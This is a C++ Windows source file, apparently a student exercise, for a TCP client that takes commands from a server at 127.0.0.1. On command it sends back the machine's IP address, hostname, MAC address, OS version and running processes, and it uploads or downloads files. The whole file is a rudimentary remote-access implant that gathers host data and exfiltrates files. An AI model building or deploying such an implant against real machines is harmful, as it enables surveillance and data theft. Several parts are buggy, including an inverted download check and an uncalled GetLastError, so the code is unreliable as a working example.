#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <string>
#include <winsock2.h>
#include <iostream>
#include <string>
#include <vector>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>
#include <functional>
#include <iomanip>
#include <sstream>
#include <Windows.h>
#include <VersionHelpers.h>
#include <Psapi.h>
#include <locale>
#include <tchar.h>
#include <algorithm>

#pragma comment(lib, "WS2_32")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace std;

string upload(const string& filePath, int clientSocket)
{
    // Extract the file name from the file path
    size_t lastSlashIndex = filePath.find_last_of("/\\");
    string fileName = filePath.substr(lastSlashIndex + 1);
    cout << fileName << endl;

    // Open the file to be uploaded
    ifstream fileStream(filePath, ios::in | ios::binary);
    if (!fileStream) {
        cerr << "Error: could not open file " << filePath << endl;
        closesocket(clientSocket);
        WSACleanup();
        return "";
    }

    // Read the file into a string
    string fileData((istreambuf_iterator<char>(fileStream)), istreambuf_iterator<char>());

    return fileData;
}


string download(int clientSocket, const string& filePath) {
    // Send the file path to the server
    int result = send(clientSocket, filePath.c_str(), static_cast<int>(filePath.size() + 1), 0);
    if (result == SOCKET_ERROR) {
        cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        WSACleanup();
        return "";
    }

    // Receive the file data from the server
    string fileData;
    const int bufferSize = 1024;
    char buffer[bufferSize];
    int bytesRead;
    do {
        bytesRead = recv(clientSocket, buffer, bufferSize, 0);
        if (bytesRead > 0) {
            fileData.append(buffer, bytesRead);
        }
    } while (bytesRead == bufferSize);

    return fileData;
}

void getComputerName() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(hostname) / sizeof(char);

    if (GetComputerNameA(hostname, &size)) {
        cout << "Hostname: " << hostname << endl;
    }
    else {
        cout << "Could not get hostname, error: " << GetLastError << endl;
    }
}

string getIpAddress()
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        cerr << "Failed to initialize Winsock" << endl;
        return "";
    }

    char hostname[NI_MAXHOST];
    if (gethostname(hostname, NI_MAXHOST) != 0)
    {
        cerr << "Failed to get hostname" << endl;
        return "";
    }

    addrinfo* result;
    addrinfo hints = {};
    hints.ai_family = AF_INET;

    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        cerr << "Failed to get address info, error code: " << WSAGetLastError() << endl;
        return "";
    }

    sockaddr_in* sockAddr = (sockaddr_in*)result->ai_addr;
    char buffer[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(sockAddr->sin_addr), buffer, INET_ADDRSTRLEN);

    freeaddrinfo(result);
    return buffer;
}

string getMacAddress()
{
    IP_ADAPTER_INFO adapterInfo[16];
    ULONG bufferSize = sizeof(adapterInfo);
    DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
    if (result != ERROR_SUCCESS)
    {
        cerr << "Failed to get adapter info, error code: " << result << endl;
        return "";
    }

    PIP_ADAPTER_INFO adapter = adapterInfo;
    vector<unsigned char> macAddress;
    for (size_t i = 0; i < adapter->AddressLength; i++)
    {
        macAddress.push_back(adapter->Address[i]);
    }

    ostringstream oss;
    oss << hex << setfill('0');
    for (auto byte : macAddress)
    {
        oss << setw(2) << static_cast<int>(byte) << ":";
    }
    string macAddressStr = oss.str();
    macAddressStr.pop_back();

    return macAddressStr;
}

string getOS()
{
    if (IsWindows10OrGreater())
    {
        return "Windows 10";
    }
    else if (IsWindows8Point1OrGreater())
    {
        return "Windows 8.1";
    }
    else if (IsWindows8OrGreater())
    {
        return "Windows 8";
    }
    else if (IsWindows7OrGreater())
    {
        return "Windows 7";
    }
    else if (IsWindowsVistaOrGreater())
    {
        return "Windows Vista";
    }
    else if (IsWindowsServer())
    {
        return "Windows Server";
    }
    else if (IsWindowsXPOrGreater())
    {
        return "Windows XP";
    }
    else
    {
        return "Unknown OS";
    }
}

vector<wstring> getRunningProcesses()
{
    DWORD processes[1024];
    DWORD numProcesses;
    vector<wstring> processNames;

    if (!EnumProcesses(processes, sizeof(processes), &numProcesses))
    {
        return processNames;
    }

    numProcesses /= sizeof(DWORD);

    for (DWORD i = 0; i < numProcesses; i++)
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess != NULL)
        {
            HMODULE hMod;
            DWORD cbNeeded;

            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
            {
                TCHAR szProcessName[MAX_PATH];

                if (GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR)))
                {
                    processNames.push_back(szProcessName);
                }
            }

            CloseHandle(hProcess);
        }
    }

    return processNames;
}


int main(int argc, char* arg[]) {

    //Setting up DLL

    SOCKET clientSocket;
    int port = 8080;
    WSADATA wsaData;
    int wsaerr;
    int resultInt;
    string serverAddress = "127.0.0.1";
    string uploadPath = "C:\\Users\\student\\Desktop\\example.txt";
    string downloadPath = "C:\\Users\\student\\Desktop\\downloaded.txt";

    WORD wVersionRequested = MAKEWORD(2, 2);
    wsaerr = WSAStartup(wVersionRequested, &wsaData);
    if (wsaerr != 0) {
        cout << "The Winsock dll was not found" << endl;
        return 0;
    }
    else {
        cout << "The Winsock dll was found!" << endl;
        cout << "The status" << wsaData.szSystemStatus << endl;
    }

    //Setting up the client socket

    clientSocket = INVALID_SOCKET;
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Error at socket: " << WSAGetLastError() << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Socket() is working..." << endl;
    }

    //Connecting to the server
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    InetPton(AF_INET, _T("127.0.0.1"), &clientService.sin_addr.s_addr);
    clientService.sin_port = htons(port);
    if (connect(clientSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        cout << "Error at connect(): Failed to connect" << endl;
        WSACleanup();
        return 0;
    }
    else {
        cout << "Client connection is working!" << endl;
        cout << "The client can now start to send and recieve data from the server..." << endl;

    }

    //Get command from the server
    //Commands:
    //  IPADDRESS
    //  USERNAME
    //  MACADDRESS
    //  OS VERSION
    //  RUNNING PROCESSES
    //  UPLOAD
    //  DOWNLOAD

    //receive command from server
    char buffer[200];
    int byteCount = recv(clientSocket, buffer, 200, 0);
    string str(buffer);
    if (byteCount > 0) {
        if (str == "IPADDRESS") {
            //Send IP Address

            string ipAddress = getIpAddress();
            if (ipAddress != "") {
                const char* msg = ipAddress.c_str();
                int bytesSent = send(clientSocket, msg, strlen(msg), 0);
                if (bytesSent == SOCKET_ERROR) {
                    cout << "Error at send(): " << WSAGetLastError() << endl;
                    WSACleanup();
                    return 0;
                }
                else {
                    cout << "Message sent to server: " << msg << endl;
                }
            }
        }
        else if (str == "USERNAME") {
            //Send Hostname

            char hostname[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(hostname) / sizeof(char);

            if (GetComputerNameA(hostname, &size)) {
                cout << "Message sent to server: " << hostname << endl;
                send(clientSocket, hostname, strlen(hostname), 0);
            }
            else {
                cout << "Could not send hostname. Error: " << GetLastError << endl;
            }
        }
        else if (str == "MACADDRESS") {
            //Send MAC Address

            string MacAddress = getMacAddress();
            if (MacAddress != "") {
                const char* macmsg = MacAddress.c_str();
                int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
                if (bytesSent == SOCKET_ERROR) {
                    cout << "Error at send(): " << WSAGetLastError() << endl;
                    WSACleanup();
                    return 0;
                }
                else {
                    cout << "Message sent to server: " << macmsg << endl;
                }
            }
        }
        else if (str == "OS VERSION") {
            //Send OS Version

            string osMessage = getOS();
            int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
            if (bytesSent == SOCKET_ERROR) {
                cout << "Error while sending OS: " << WSAGetLastError() << endl;
            }
            else {
                cout << "Message sent to server: " << osMessage << endl;
            }
        }
        else if (str == "RUNNING PROCESSES") {
            //Send Running Processes

            vector<wstring> processes = getRunningProcesses();
            string result = "Running processes: \n";
            for (const auto& process : processes) {
                result += string(process.begin(), process.end()) + "\n";
            }

            int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
            if (bytesSent == SOCKET_ERROR) {
                cout << "Error while sending running processes: " << WSAGetLastError() << endl;
                WSACleanup();
                return 0;
            }
        }
        else if (str == "UPLOAD") {
            string fileData = upload(uploadPath, clientSocket);
            if (fileData.empty()) {
                cerr << "Error: upload failed - file empty" << endl;
                return 0;
            }
            else {
                resultInt = send(clientSocket, fileData.c_str(), fileData.size(), 0);
                if (resultInt == SOCKET_ERROR) {
                    cerr << "Error: send failed with error code " << WSAGetLastError() << endl;
                    closesocket(clientSocket);
                    WSACleanup();
                    return 0;
                }
                cout << "File uploaded successfully." << endl;
            }
        }
        else if (str == "DOWNLOAD") {
            string fileData = download(clientSocket, downloadPath);
            if (!fileData.empty()) {
                cout << "File did not download correctly" << endl;
                cout << fileData << endl;
                closesocket(clientSocket);
                WSACleanup();
                return 0;
            }
            else {
                cout << "File downloaded successfully" << endl;
            }
        }
    }
    else {
        WSACleanup();
    }

    //Close the socket
    system("pause");
    WSACleanup();
    return 0;
}
